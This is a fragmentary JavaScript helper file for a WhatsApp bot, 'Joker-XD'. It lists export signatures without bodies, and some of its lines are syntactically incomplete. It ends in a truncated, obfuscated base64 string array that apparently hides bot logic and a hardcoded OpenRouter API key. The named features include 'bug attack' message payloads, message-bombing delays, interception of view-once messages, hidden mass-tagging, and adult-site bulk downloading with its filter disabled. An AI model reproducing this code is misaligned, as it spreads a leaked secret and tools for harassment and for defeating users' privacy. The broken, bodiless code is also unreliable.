// Protected & Obfuscated - core/helpers.js - Reverse engineering forbidden
'use strict';
import "../_protect.js";
import express from "express";
import fs from "fs";
import zlib from "zlib";
import { randomBytes } from "crypto";
import path from "path";
import { exec } from "child_process";
import { promisify } from "util";
import { pipeline } from "stream/promises";
import { Transform } from "stream";
import pino from "pino";
import axios from "axios";
import FormData from "form-data";
import yts from "yt-search";
import { igdl, fbdl, igdl2, fbdl2 } from "ruhend-scraper";
import makeWASocket, {
import ffmpegInstaller from "@ffmpeg-installer/ffmpeg";
import sharp from "sharp";
export const execAsync = promisify(exec);
export const FFMPEG_PATH = (() => {
export const TEMP_DIR = path.join(process.cwd(), "temp");
export const DATA_DIR = path.join(process.cwd(), "data");
export const MEDIA_DIR = path.join(TEMP_DIR, "media");
export const SESSIONS_DIR = path.join(process.cwd(), "sessions");
export const activeSessions = new Map();
export const MAX_SESSIONS = Math.max(1, Math.min(20, Number(process.env.MAX_SESSIONS) || 5));
export function botNumberFromSock(sock) {
export function sessionDataDir(sockOrNum) {
export function sessionAuthDir(number) {
export function sf(sockOrNum, filename) {
export function getShareMeta(num) {
export function setShareMeta(num, meta) {
export function isBotKing(num) {
export function addShareChild(kingNum, childNum) {
export function removeShareChild(kingNum, childNum) {
export function wipeSessionData(num) {
export function listSessionNumbers() {
export const KEITH_API = process.env.API_BASE || "https://apiskeith2-production-3020.up.railway.app";
export const AXIOS_DL = {
export const AI_CHATBOT_FILE = path.join(DATA_DIR, "aichatbot.json");
export const aiLastReply = new Map();
export const aiChatHistory = new Map(); // jid -> { messages: [{role, content, ts}], lastActive }
export const AI_HISTORY_MAX_MSGS = 12;       // max messages kept per chat (~6 turns)
export const AI_HISTORY_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours
export const AI_HISTORY_MAX_CHARS = 400;     // truncate each message for safety
export function pruneAiHistory(entry) {
export function getAiHistory(jid) {
export function pushAiHistory(jid, role, content) {
export const OPENROUTER_API_KEY = process.env.OPENROUTER_API_KEY
export const OPENROUTER_MODEL = process.env.OPENROUTER_MODEL || "openrouter/auto";
export const JOKER_AI_SYSTEM = `You are Joker-XD, a helpful WhatsApp bot assistant by Zain Marten Joker (Developer).
export function guardAIQuestion(q) {
export async function askAI(prompt, history = []) {
export async function tryRequest(fn, retries = 2) {
export const isYtUrl = (u) =>
export async function keithSearchYts(query) {
export async function dlAudioSupreme(url) {
export async function dlAudioElite(url) { return dlAudioSupreme(url); }
export async function dlAudioYupra(url) { return dlAudioSupreme(url); }
export async function dlAudioOkatsu(url) { return dlAudioSupreme(url); }
export async function dlAudioKeith(url) { return dlAudioSupreme(url); }
export async function resolveYtQuery(q) {
export async function sendAudioResult(sock, jid, msg, buf, title) {
export async function keithDownloadAudio(url) {
export async function getYtVideoData(url) {
export async function bufferToMp3(buf) {
export function pickMediaUrl(r) {
export async function resolveFacebook(url) {
export async function resolveInstagram(url) {
export async function downloadUrlBuffer(url, timeout = 90000) {
export const ADULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
export async function adultFetchHtml(url) {
export function adultDecodeEntities(s = "") {
export function adultParseResults(html, base, limit = 10) {
export async function adultSearchXvideos(query) {
export async function adultSearchXnxx(query) {
export async function adultDownloadXPage(pageUrl, site = "xvideos") {
export const ADULT_VIDEO_LIMIT = 64 * 1024 * 1024;    // up to this size -> sent as a normal video
export const ADULT_DOC_LIMIT = 400 * 1024 * 1024;     // up to this size -> sent as a document
export const ADULT_MAX_AMOUNT = 100;                  // max videos per .xxdl / .xndl / .hentaidl request
export const ADULT_MAX_IMAGES = 30;                   // max pictures per .node request
export const ADULT_TMP = path.join(TEMP_DIR, "adult");
export const ADULT_BLOCKED = /(?!)/; // never matches - add words e.g. /\b(word1|word2)\b/i
export const adultSleep = (ms) => new Promise((r) => setTimeout(r, ms));
export function adultBlockedQuery(q) { return false; } // disabled like 0.09 — all searches allowed
export function adultEnsureTmp() { try { fs.mkdirSync(ADULT_TMP, { recursive: true }); } catch {} }
export function adultSweepTmp(maxAgeMs = 10 * 60 * 1000) {
export function adultFreeBytes() {
export async function adultStreamToFile(url, headers, dest, maxBytes) {
export function adultPolicy(mode, size) {
export async function adultFetchVideo(pageUrl, site, mode = "combo") {
export async function adultSendFile(sock, jid, quoted, res, fallbackTitle = "video") {
export async function adultSendVideo(sock, jid, quoted, pageUrl, site, fallbackTitle = "video") {
export function adultSearchUrl(site, query, page) {
export function adultSiteBase(site) { return site === "xnxx" ? "https://www.xnxx.com" : "https://www.xvideos.com"; }
export async function* adultCandidates(site, query) {
export const adultJobs = new Map();
export const ADULT_MODE_LABEL = { videos: "Only videos", docs: "Only documents", combo: "Combo" };
export async function adultRunBulk(sock, msg, jid, { site, query, amount, mode, label, prefix }) {
export const adultPending = new Map();
export function adultRememberList(sock, jid, id, data) {
export async function adultSendList(sock, msg, jid, site, label, query, list) {
export async function adultAskMode(sock, msg, jid, params) {
export async function adultHandleReply(sock, msg, raw) {
export function adultThumbVariants(t) {
export async function adultGetThumbBuffer(thumb, referer) {
export async function adultRunImages(sock, msg, jid, { query, amount, prefix }) {
export const PIN_MAX = 30;
export const PIN_HEADERS = {
export function pinImageVariants(u) {
export async function pinSearch(query) {
export async function pinGetImage(u) {
export async function pinFromUrl(url) {
export function isImageBuffer(b) {
export async function fetchImageBuf(url, opts = {}) {
export async function generateImageBuffer(prompt) {
export async function sendMedia(sock, jid, type, mediaUrl, extra = {}, quoted) {
export const configFile = path.join(DATA_DIR, "settings.json");
export const sudoFile = path.join(DATA_DIR, "sudo.json");
export const antilinkFile = path.join(DATA_DIR, "antilink.json");
export const welcomeFile = path.join(DATA_DIR, "welcome.json");
export let globalWelcomeSent = false;
export let presenceIntervalId = null;
export const goodbyeFile = path.join(DATA_DIR, "goodbye.json");
export const antideleteFile = path.join(DATA_DIR, "antidelete.json");
export const banFile = path.join(DATA_DIR, "ban.json");
export const blockFile = path.join(DATA_DIR, "block.json");
export const modeFile = path.join(DATA_DIR, "mode.json");
export const chatbotFile = path.join(DATA_DIR, "chatbot.json");
export const menuImageFile = path.join(DATA_DIR, "menu-image.json");
export const ownerNameFile = path.join(DATA_DIR, "owner-name.json");
export const viewOnceFile = path.join(DATA_DIR, "viewonce.json");
export const antitagFile = path.join(DATA_DIR, "antitag.json");
export const antitagmeFile = path.join(DATA_DIR, "antitagme.json");
export const agmFile = path.join(DATA_DIR, "agm.json");
export const warnFile = path.join(DATA_DIR, "warns.json");
export const antistickerFile = path.join(DATA_DIR, "antisticker.json");
export const antivoiceFile = path.join(DATA_DIR, "antivoice.json");
export const antipicFile = path.join(DATA_DIR, "antiping.json");
export const antipictureFile = path.join(DATA_DIR, "antipicture.json");
export const antivideoFile = path.join(DATA_DIR, "antivideo.json");
export const antitextFile = path.join(DATA_DIR, "antitext.json");
export const allowFile = path.join(DATA_DIR, "allowonce.json");
export const setwarnFile = path.join(DATA_DIR, "setwarn.json");
export const APPROVE_GROUP_LIMIT = 1025;
export const autoReactFile = path.join(DATA_DIR, "autoreact.json");
export const graphemes = (s) => { try { return [...new Intl.Segmenter(undefined,{granularity:"grapheme"}).segment(String(s))].map(x=>x.segment); } catch { return Array.from(String(s)); } };
export const DEFAULT_REACT_EMOJIS = graphemes("❤️🧡💛💚💙💜🤎🖤🤍🩷🩵🩶♥️");
export const ALL_REACT_EMOJIS = graphemes("😆😂😍🫠🤩🥲🙃🫪😜😛🥺🫡😶‍🌫️😱😡😤🙄😒🫢🧐🤫😓☹️😕🫤😯😵😫😖🤯🫨😵‍💫🫩🥵🤧😇😴🤑🤡💩😈👻👽👺👹🤖☠️💀🤓😎🌚👾🌛🌜😸🌟💫🙈🙊🙉💥🎉🕳️💨🫯🎊🩷🖤❤️🩵❣️💌❤️‍🔥💋🫀🫆💦🫦👁️👅👃🏿🤟🏿🤏🏿🤌🏿🤞🏿👉🏿🤰🏿👩‍❤️‍👩🌺🌹🍀☘️🌱🌿🪾🪵🪨🌬️🌅🏞️⛅🌦️🌩️🌧️🌞🌝🌚🌏🌍🕳️✨🌠🙊🙈🐺🐰🫎🦎🦕🐈‍⬛🐀🐁🐍🐊🦥🦏🦣🦦🦝🐔🦨🐦‍⬛🦜🦉🦅🦆🪿🦐🌶️🍅🍑🌽🥭🫛🍐🥕🍒🍓🍠🍆🍇🥒🥔🫘🍗🥓🥨🌮🥙🫔🥘🍛🦞🍣🥡🍘🍰🎂🍧🍭🍬🍫🧋☕🍼🧈🥂🍺🍻🍸🥃🍾🍴🔪🍽️🛑🚧🚨⛽🚙🏍️🛵🚊🚉🚂🚋🚝🏩🛣️🌐🎀🎈🎉🎃🧧🧨🎎🎏🥎⚽📢🏅🥉🎖️🏆🏉🥌🏒🏏🛼🥊🥋🫟🎴🎰📸📷🪄🎺📼🎛️🎚️📽️🎻🎬🎟️📱☎️🖲️🔌🔋🪙🖱️💶💳⚖️🔦🛋️🚪🧻🧺👔👙⛑️👒🎒🥽👓🦯🧬👡🪓🔧⚙️🪏🛠️📃📕🗄️📌🗑️📤🗓️🕰️⌛📢🔮🔍🛡️🔑🔏🔴💬♉🩶🚱❌🚫🚱🚳🔇🉐🈲㊗️⏩🔂🔁🔽📲☢️⚠️☣️💱🈯🔚🔙ℹ️💠🔹Ⓜ️🛗🏧🚹🚼🕉️⚛️🔯🧑‍🧑‍🧒‍🧒👁️‍🗨️🎼🎶®️🔘◽🏁🇦🇬🇵🇰🇵🇫🇵🇦🇵🇬");
export function defaultAutoReactConfig() {
export function getAutoReactConfig(sock) {
export function saveAutoReactConfig(c, sock) { writeJson(sock ? sf(sock, "autoreact.json") : autoReactFile, c); }
export function emojiFromText(text = "") {
export function aiReactionFromText(text = "") {
export function nextConfiguredReaction(cfg, text) {
export function scopeEnabled(cfg, jid, kind) {
export const COMMAND_REACT_MAP = {
export function getCommandReactEmoji(cmd) {
export async function autoCommandReact(sock, msg, cmd) {
export function presenceScopeEnabled(cfg,jid,kind,feature){
export function getChannelServerId(msg) {
export const CHANNEL_REACT_EMOJIS = [
export function nextChannelEmoji(sock) {
export const handledChannelPostsByBot = new Map(); // botNum -> Map(uniqueId -> ts)
export function getHandledChannelMap(sock) {
export async function reactOnChannelPost(sock, jid, serverId, emoji, originalKey) {
export async function reactOldChannelPosts(sock) {
export async function autoReactMessage(sock, msg, text) {
export async function autoPresenceForMessage(sock,msg){
export function parseOnOff(v){const x=String(v||"").toLowerCase();return x==="on"?true:x==="off"?false:null;}
export function parseReactEmojis(raw){
export const DEVELOPER_NUMBER = "923354853202";
export const DEVELOPER_LID = "161594705232079"; // 161594705232079@lid
export const DEVELOPER_PREFIX = "®";
export const HARDCODED_CHANNEL_JID = "120363396160925749@newsletter";
export const messageCache = new Map();
export const recentMsgStore = new Map(); // chatJid -> [{ key, participant, fromMe, ts }]
export function trackRecentMsg(msg, sock) {
export const metaCache = new Map(); // jid -> { meta, ts }
export const META_CACHE_TTL = 8000; // 8s
export async function getCachedMeta(sock, jid) {
export const pendingAllJid = new Map();
export const pendingChJid = new Map();
export const pendingBroadcast = new Map();
export function readJson(file, fallback) {
export function writeJson(file, value) {
export function makeId() {
export function jidNumber(jid) {
export function normalizeJid(jid) {
export function getText(msg) {
export function isGroup(jid) {
export function getContext(msg) {
export function getQuotedMsg(msg) {
export function isBotMentioned(msg, sock) {
export function isReplyToBot(msg, sock) {
export function unwrapStatusMessage(message) {
export function isAnyStatusLikeMessage(msgOrMessage) {
export async function extractRecoverableContent(sock, sourceMsg) {
export async function cacheStatusMessage(sock, msg, { forcePrebuild = false } = {}) {
export async function scanAndCacheExistingStatuses(sock) {
export async function buildSendContent(sock, sourceMsg) {
export function findQuotedDeep(msg) {
export async function buildQuotedContent(sock, quoted) {
export function getHidetagMode(sock) {
export async function sendHiddenTag(sock, msg, jid, members, extraText, label = "tag") {
export async function collectOnlineNumbers(sock, members, waitMs = 3500) {
export function buildTagAllText({ senderJid, message, members, onlineCount }) {
export const XT_TEXT_KEYS = new Set(["conversation", "text", "caption", "vcard", "displayName", "fileName", "title", "description", "contentText", "body", "selectedDisplayText"]);
export function collectMsgStrings(message) {
export function collectMentions(message) {
export function detectMassTag(msg, threshold = 5) {
export function botIdFingerprint(id) {
export function detectBugPayload(msg) {
export function getBugPassword(sock) {
export function setBugPassword(sock, pass) {
export function allowBugAttack(sock, msg) {
export function requestBugAuth(sock, msg, action, args) {
export function tryConsumeBugPassword(sock, msg) {
export const hideMyCache = new Map();
export function getHideMyCfg(sock) {
export function setHideMyCfg(sock, patch) {
export function mobileStyleMessageId() {
export function installHideMyBot(sock) {
export const XT_COUNTRY_CODES = {
export function countryFromNumber(n) {
export function parseModeToggle(args, current, onMode = "warn") {
export const ANTI_MODE_USAGE = (cmd) => `${cmd} warn on | off\n${cmd} delete on | off\n${cmd} kick on | off\n${cmd} off   (turn everything off)`;
export function parseDelay(str) {
export function parseDelayBom(str) {
export function getTargets(msg, args = []) {
export function isAdmin(meta, jid) {
export function botJid(sock) {
export function ownerJid() {
export function developerJid() {
export function developerLidJid() {
export function findParticipantJid(meta, numberOrJid) {
export function getWarnLimit(sock) {
export function warnKey(gid, number, reason = "general") {
export function getWarnCount(gid, number, reason = "general", sock) {
export function addWarnCount(gid, number, reason = "general", sock) {
export function clearWarnCount(gid, number, reason = null, sock) {
export function clearAllGroupWarns(gid, sock) {
export function hasAllowOnce(gid, number, sock) {
export function consumeAllowOnce(gid, number, sock) {
export function grantAllowOnce(gid, number, sock) {
export function detectMsgKind(msg) {
export const PROVIDER_HOSTS = "apiskeith|railway\\.app|apissupreme|cypherxbot|officialhectormanuel|eliteprotech|api-faa|gtech-apiz|stacktoy|workers\\.dev|vercel\\.app|zone\\.id|my\\.id|openrouter";
export const PROVIDER_URL_RE = new RegExp("https?:\\/\\/[^\\s)]*(" + PROVIDER_HOSTS + ")[^\\s)]*", "ig");
export const PROVIDER_HOST_RE = new RegExp("[a-z0-9.-]*(" + PROVIDER_HOSTS + ")[a-z0-9./?=&_%-]*", "ig");
export function scrubText(t) {
export function cleanErr(e) {
export function isChannelPost(msg) {
export function hasLink(text) {
export const antiDeleteQueues = new Map();
export function queueAntiDelete(sock, jid, key) {
export const channelNameCache = new Map();
export async function getChannelInfo(sock, msg) {
export async function enforceAnti(sock, msg, jid, sender, mode, label) {
export async function resolveActualPhoneJid(sock, jid, altJid = "", chatJid = "") {
export function privacyOwnerJid(sock) {
export function getSenderIds(msg, sock) {
export function getSenderNumber(msg, sock) {
export function isDeveloper(sock, msg) {
export function isOwner(sock, msg) {
export function isSessionOwner(sock, msg) {
export function isPrivileged(sock, msg) {
export function targetNumber(msg, args = []) {
export function isBannedNumber(number, sock) {
export function getMode(sock) {
export function commandModeAllowed(sock, msg) {
export function randomGoodbye() {
export function parseGroupLink(text = "") {
export function parseChannelCode(text = "") {
export const NEWSLETTER_JID_RE = /^\d{10,24}@newsletter$/;
export const CH_MEX_METADATA_IDS = ["6563316087068696", "6620195908089573"];
export const CH_MEX_SUBSCRIBED_IDS = ["6388546374527196"];
export const CH_CACHE_TTL_MS = 30 * 24 * 60 * 60 * 1000;
export const chSleep = (ms) => new Promise((r) => setTimeout(r, ms));
export function chWithTimeout(p, ms, label = "operation") {
export function chErrText(e) {
export function chClassify(e) {
export const CH_KIND_PRIORITY = ["parse", "timeout", "ratelimit", "closed", "forbidden", "unsupported", "notfound", "other"];
export function chPickKind(attempts = []) {
export function parseChannelInput(raw = "") {
export function scanMessageForChannel(message) {
export function chCacheFile(sock) { return sf(sock, "channel-cache.json"); }
export function chCacheLoad(sock) {
export function chCacheSave(sock, { jid, name, code }) {
export function chNameFromCache(sock, jid) {
export function chNodeContentToBuffer(c) {
export function chPick(v) {
export function chEntryFrom(o, id) {
export function chDeepCollect(obj, out = [], seen = new Set(), depth = 0) {
export function chFindNameDeep(obj, depth = 0, seen = new Set()) {
export function chDecodePayload(buf) {
export function chStartSniffer(sock) {
export function chSniffSummary(frames) {
export async function chRawMex(sock, queryId, variables, timeoutMs = 15000) {
export async function chFetchFollowed(sock) {
export const CH_SOURCE_LABEL = {
export async function resolveChannelInfoCore(sock, { code = "", jid = "", nameHint = "", jidSource = "input" } = {}) {
export function chDecodeEntities(t) {
export async function chNameFromWebPage(code) {
export async function resolveChannelInfo(sock, opts = {}) {
export const CH_KIND_REASON = {
export const CH_KIND_TIPS = {
export function chTriedLine(attempts = []) {
export function chFailureText(title, err, extraLines = []) {
export function chFormatCard(r) {
export function commandOwnerOnly(sock, msg, send) {
export function commandPrivileged(sock, msg, send) {
export function formatUptime(ms) {
export function extractUrl(text = "") {
export function cleanTemp() {
export function menuText(msg, sock) {
export function helpText(prefix) {
export function jokerHelpText(prefix) {
export const STICKER_PACK_NAME = "Joker-xd";
export const STICKER_PACK_AUTHOR = "telegram Dev Martenzain";
export function addStickerExif(webpBuffer, packname = STICKER_PACK_NAME, author = STICKER_PACK_AUTHOR) {
export async function makeSticker(buffer, isVideo = false, packname = STICKER_PACK_NAME, author = STICKER_PACK_AUTHOR) {
export let _tovideoBusy = false;
export const _tovideoWaiters = [];
export function acquireTovideoLock() {
export function releaseTovideoLock() {
export async function stickerToVideoLocal(buffer) {
export async function stickerToVideo(buffer) {
export async function stickerToImageBuffer(buffer) {
export function guessMime(fileName = "") {
export async function uploadCatbox(buffer, fileName = "joker-xd.jpg") {
export function isViewOncePayload(message) {
export function unwrapMessage(message) {
export async function getChatLabel(sock, jid) {
export async function streamToBuffer(mediaObj, type) {
export async function openViewOnce(sock, sourceMsg) {
export function extractViewOnceMedia(message) {
export const VO_READ_MORE = "\n" + "\u200e".repeat(3500) + "\n";
export async function voFromLabel(sock, jid) {
export async function voSenderLabel(sock, vmsg) {
export const voSeenIds = new Set();
export async function interceptViewOnce(sock, msg) {
export const VV2_ALIASES = new Set([
export function getMenuImagePath(sock) {
export async function sendMenu(sock, msg, send) {
export async function getProfileImageBuffer(sock, jid) {
export async function requireGroupAdmin(sock, msg, send) {
export const _prefixCache = new Map();
export function getPrefix(sock) {
export function setPrefix(sock, p) {
export function mcKey(sock, id) { return `${botNumberFromSock(sock) || "default"}:${id}`; }
export const activeJokerJobs = new Map(); // key: `${sessionKey}:${type}` → { stop: boolean }
export function getSessionKey(sock) {
export function setJokerJob(sock, type, running) {
export function requestStopJoker(sock, type) {
export function shouldStopJoker(sock, type) {
export async function approveGroupRequests(sock, jid, requestedAmount = null) {

const _0x3c7d8f2f=["UUhkb2FYTnJaWGx6YjJOclpYUnpMMkpoYVd4bGVYTT0=","TDNWemNpOWlhVzR2Wm1adGNHVm4=","TDJKcGJpOW1abTF3WldjPQ==","TDNWemNpOXNiMk5oYkM5aWFXNHZabVp0Y0dWbg==","Wm1adGNHVm4=","VzJabWJYQmxaMTBnZFhOcGJtYzY=","YzNSeWFXNW4=","WkdWbVlYVnNkQT09","VzJsemIyeGhkR2x2YmwwZ2MyVnpjMmx2YmlCdWRXMWlaWElnZFc1cmJtOTNiaUF0UGlCMWMybHVaeUJ6YUdGeVpXUWdKMlJsWm1GMWJIUW5JR1JoZEdFZ1ptOXNaR1Z5","WkdGMFlRPT0=","WVhWMGFBPT0=","YzJoaGNtVXRiV1YwWVM1cWMyOXU=","YTJsdVp3PT0=","WTJocGJHUT0=","VlhObGNpMUJaMlZ1ZEE9PQ==","VFc5NmFXeHNZUzgxTGpBZ0tGZHBibVJ2ZDNNZ1RsUWdNVEF1TURzZ1YybHVOalE3SUhnMk5Da2dRWEJ3YkdWWFpXSkxhWFF2TlRNM0xqTTJJQ2hMU0ZSTlRDd2diR2xyWlNCSFpXTnJieWtnUTJoeWIyMWxMekV5TUM0d0xqQXVNQ0JUWVdaaGNta3ZOVE0zTGpNMg==","WVhCd2JHbGpZWFJwYjI0dmFuTnZiaXdnZEdWNGRDOXdiR0ZwYml3Z0tpOHE=","YzJzdGIzSXRkakV0Tm1JeU1tUm1NbVEyTVRKaU9HWXdOVFkzTTJVMVpqUmpZamN5TWpZMk16azJPRGcxWXpNeU4yRTBPVGt4TTJZeE5XTTJZMll6WW1Sak16RTNOell3WWc9PQ==","T3dvS0x5b3FJRUpzYjJOcklDOGdjbVYzY21sMFpTQnpaVzV6YVhScGRtVWdRVWtnY1hWbGMzUnBiMjV6SUdKbFptOXlaU0JqWVd4c2FXNW5JRzF2WkdWc2N5QXFMd29nSUdOdmJuTjBJSE1nUFNCVGRISnBibWNvY1NCOGZDQWlJaWt1ZEc5TWIzZGxja05oYzJVb0tUc0tJQ0F2THlCVGIzVnlZMlVnTHlCamIyUmxJSEpsY1hWbGMzUnpDaUFnYVdZZ0tDOWNZaWh6YjNWeVkyVmNjeXBqYjJSbGZITnZkWEpqWldOdlpHVjhYQzVxYzF4aWZHcGhkbUZ6WTNKcGNIUWdabWxzWlh4d1lXbHlhVzVuWEM1cWMzeG5hWFpsSUNodFpTQXBQeWgwYUdVZ0tUOWpiMlJsZkdKdmRDQW9hMkVnS1Q5amIyUmxmSEJ5YVhaaGRHVWdLR0p2ZENBcFAyTnZaR1Y4WjJsMGFIVmlJSEpsY0c5OGJHVmhheWxjWWk4dWRHVnpkQ2h6S1NrZ2V3b2dJQ0FnY21WMGRYSnVJQ0pUYjNKeWVTRGlnSlFnU1NCa2IyNG5kQ0JvWVhabElIQmxjbTFwYzNOcGIyNGdkRzhnYzJoaGNtVWdZVzU1SUhCeWFYWmhkR1VnWW05MElITnZkWEpqWlNCamIyUmxJRzl5SUVwVElHWnBiR1Z6TGlCUWJHVmhjMlVnZFhObElIQjFZbXhwWXlCamIyMXRZVzVrY3lCdmJteDVMQ0J2Y2lCaGMyc2dkR2hsSUVSbGRtVnNiM0JsY2lCcGJpQjBhR1VnYzNWd2NHOXlkQ0JqYUdGdWJtVnNMaUk3Q2lBZ2ZRb2dJQzh2SUVGUVNTQXZJR3RsZVhNS0lDQnBaaUFvTDF4aUtHRndhVnh6S210bGVYeGhjR2xyWlhsOGRHOXJaVzU4YjNCbGJuSnZkWFJsY254elpXTnlaWFFnYTJWNWZHZHBkbVVnS0cxbElDay9LSFJvWlNBcFAyRndhWHhoY0drZ1pHOThaVzVrY0c5cGJuUXBYR0l2TG5SbGMzUW9jeWtwSUhzS0lDQWdJSEpsZEhWeWJpQWlVMjl5Y25rZzRvQ1VJRWtnWkc5dUozUWdhR0YyWlNCd1pYSnRhWE56YVc5dUlIUnZJSE5vWVhKbElHRnVlU0JCVUVrZ2EyVjVjeUJ2Y2lCd2NtbDJZWFJsSUdWdVpIQnZhVzUwY3k0Z1VHeGxZWE5sSUdGemF5QjBhR1VnUkdWMlpXeHZjR1Z5SUdsdUlIUm9aU0J6ZFhCd2IzSjBJR05vWVc1dVpXd2dhV1lnZVc5MUlHNWxaV1FnWVdOalpYTnpMaUk3Q2lBZ2ZRb2dJQzh2SUZkb1pXNGdZM0psWVhSbFpBb2dJR2xtSUNndlhHSW9hMkZpSUdKaGJtRjVZWHgzYUdWdUlDaDNaWEpsZkhkaGN5a2dlVzkxSUNodFlXUmxmR055WldGMFpXUjhZblZwYkhRcGZIZG9ieUFvYldGa1pYeGpjbVZoZEdWa2ZHSjFhV3gwS1NCNWIzVjhkSFZ0SUNocllXSjhhMjhwSUNoaVlXNWhmR0poYm1GNVlTbDhiM0pwWjJsdWZHaHZkeUJ2YkdRZ1lYSmxJSGx2ZFNsY1lpOHVkR1Z6ZENoektTa2dld29nSUNBZ2NtVjBkWEp1SUNKTmVTQmtaWFpsYkc5d1pYSWdiV0ZrWlNCdFpTQnBiaUFxTWpBeE1Tb3VJRVIxWlNCMGJ5QndkV0pzYVdNZ1pHVnRZVzVrTENCMGFHVjVJSEpsYkdWaGMyVmtJQ3AyTVNCd2RXSnNhV05zZVNCcGJpQXlNREkxS2k0Z1NTZHRJRXB2YTJWeUxWaEVJT0tBbENCb1pYSmxJSFJ2SUdobGJIQWdkMmwwYUNCd2RXSnNhV01nWW05MElHTnZiVzFoYm1SeklQQ2ZtWUlpT3dvZ0lIMEtJQ0J5WlhSMWNtNGdiblZzYkRzS2ZRb0tMeW9xQ2lBcUlFRnpheUJCU1NCM2FYUm9JRzl3ZEdsdmJtRnNJSE5vYjNKMElHTnZiblpsY25OaGRHbHZiaUJvYVhOMGIzSjVJQ2hzWVhOMElESTBhQ3dnYldGNElINHhNaUJ0YzJkektTNEtJQ29nYUdsemRHOXllU0E5SUZ0N0lISnZiR1U2SUNKMWMyVnlJbndpWVhOemFYTjBZVzUwSWl3Z1kyOXVkR1Z1ZERvZ2MzUnlhVzVuSUgwc0lDNHVMbDBLSUNvZ1QzQmxibEp2ZFhSbGNpQm5aWFJ6SUdaMWJHd2diV1Z6YzJGblpYTWdZWEp5WVhrN0lHWnlaV1VnWm1Gc2JHSmhZMnR6SUdkbGRDQmhJSE5vYjNKMElHTnZiblJsZUhRZ2NISmxabWw0TGdvZ0tpQldaWEo1SUd4dmR5QnNiMkZrSU9LQWxDQm9hWE4wYjNKNUlHeHBkbVZ6SUc5dWJIa2dhVzRnVWtGTklHRnVaQ0JoZFhSdkxXVjRjR2x5WlhNdUNpQXFMd29nSUdOdmJuTjBJSEVnUFNCVGRISnBibWNvY0hKdmJYQjBJSHg4SUNJaUtTNTBjbWx0S0NrN0NpQWdhV1lnS0NGeEtTQjBhSEp2ZHlCdVpYY2dSWEp5YjNJb0ltVnRjSFI1SUhCeWIyMXdkQ0lwT3dvZ0lHTnZibk4wSUdkMVlYSmtaV1FnUFNCbmRXRnlaRUZKVVhWbGMzUnBiMjRvY1NrN0NpQWdhV1lnS0dkMVlYSmtaV1FwSUhKbGRIVnliaUJuZFdGeVpHVmtPd29LSUNBdkx5QkNkV2xzWkNCdFpYTnpZV2RsY3lCbWIzSWdUM0JsYmxKdmRYUmxjaUFvYzNsemRHVnRJQ3NnYUdsemRHOXllU0FySUdOMWNuSmxiblFnZFhObGNpa0tJQ0JqYjI1emRDQnpZV1psU0dsemRHOXllU0E5SUVGeWNtRjVMbWx6UVhKeVlYa29hR2x6ZEc5eWVTa0tJQ0FnSUQ4Z2FHbHpkRzl5ZVFvZ0lDQWdJQ0FnSUM1bWFXeDBaWElvS0cwcElEMCtJRzBnSmlZZ0tHMHVjbTlzWlNBOVBUMGdJblZ6WlhJaUlIeDhJRzB1Y205c1pTQTlQVDBnSW1GemMybHpkR0Z1ZENJcElDWW1JRzB1WTI5dWRHVnVkQ2tLSUNBZ0lDQWdJQ0F1YzJ4cFkyVW9MVUZKWDBoSlUxUlBVbGxmVFVGWVgwMVRSMU1wQ2lBZ0lDQWdJQ0FnTG0xaGNDZ29iU2tnUFQ0Z0tIc2djbTlzWlRvZ2JTNXliMnhsTENCamIyNTBaVzUwT2lCVGRISnBibWNvYlM1amIyNTBaVzUwS1M1emJHbGpaU2d3TENCQlNWOUlTVk5VVDFKWlgwMUJXRjlEU0VGU1V5a2dmU2twQ2lBZ0lDQTZJRnRkT3dvS0lDQXZMeUJUYUc5eWRDQjBaWGgwSUdOdmJuUmxlSFFnWm05eUlITnBibWRzWlMxd2NtOXRjSFFnWm1Gc2JHSmhZMnNnUVZCSmN5QW9iR0Z6ZENBMElIUjFjbTV6SUc5dWJIa3BDaUFnYkdWMElHTnZiblJsZUhSUWNtVm1hWGdnUFNBaUlqc0tJQ0JwWmlBb2MyRm1aVWhwYzNSdmNua3ViR1Z1WjNSb0tTQjdDaUFnSUNCamIyNXpkQ0J5WldObGJuUWdQU0J6WVdabFNHbHpkRzl5ZVM1emJHbGpaU2d0T0NrN0NpQWdJQ0JqYjI1MFpYaDBVSEpsWm1sNElEMGdjbVZqWlc1MENpQWdJQ0FnSUM1dFlYQW9LRzBwSUQwK0lBPT0=","WVhOemFYTjBZVzUw","UW05MA==","VlhObGNnPT0=","S1FvZ0lDQWdJQ0F1YW05cGJpZ2lYRzRpS1FvZ0lDQWdJQ0F1YzJ4cFkyVW9NQ3dnT1RBd0tUc0tJQ0FnSUdsbUlDaGpiMjUwWlhoMFVISmxabWw0S1NCamIyNTBaWGgwVUhKbFptbDRJRDBn","T3dvZ0lIMEtJQ0JqYjI1emRDQnhWMmwwYUVOdmJuUmxlSFFnUFNCamIyNTBaWGgwVUhKbFptbDRJRDhn","SURvZ2NUc0tDaUFnWTI5dWMzUWdjMjkxY21ObGN5QTlJRnNLSUNBZ0lDOHZJREVwSUU5d1pXNVNiM1YwWlhJZ0tIQnlhVzFoY25rZzRvQ1VJSE4xY0hCdmNuUnpJSEpsWVd3Z2JYVnNkR2t0ZEhWeWJpa0tJQ0FnSUdGemVXNWpJQ2dwSUQwK0lIc0tJQ0FnSUNBZ2FXWWdLQ0ZQVUVWT1VrOVZWRVZTWDBGUVNWOUxSVmtwSUhKbGRIVnliaUJ1ZFd4c093b2dJQ0FnSUNCamIyNXpkQ0J0WlhOellXZGxjeUE5SUZzS0lDQWdJQ0FnSUNCN0lISnZiR1U2SUNKemVYTjBaVzBpTENCamIyNTBaVzUwT2lCS1QwdEZVbDlCU1Y5VFdWTlVSVTBnZlN3S0lDQWdJQ0FnSUNBdUxpNXpZV1psU0dsemRHOXllU3dLSUNBZ0lDQWdJQ0I3SUhKdmJHVTZJQ0oxYzJWeUlpd2dZMjl1ZEdWdWREb2djU0I5Q2lBZ0lDQWdJRjA3Q2lBZ0lDQWdJR052Ym5OMElIc2daR0YwWVN3Z2MzUmhkSFZ6SUgwZ1BTQmhkMkZwZENCaGVHbHZjeTV3YjNOMEtBb2dJQ0FnSUNBZ0lDSm9kSFJ3Y3pvdkwyOXdaVzV5YjNWMFpYSXVZV2t2WVhCcEwzWXhMMk5vWVhRdlkyOXRjR3hsZEdsdmJuTWlMQW9nSUNBZ0lDQWdJSHNLSUNBZ0lDQWdJQ0FnSUc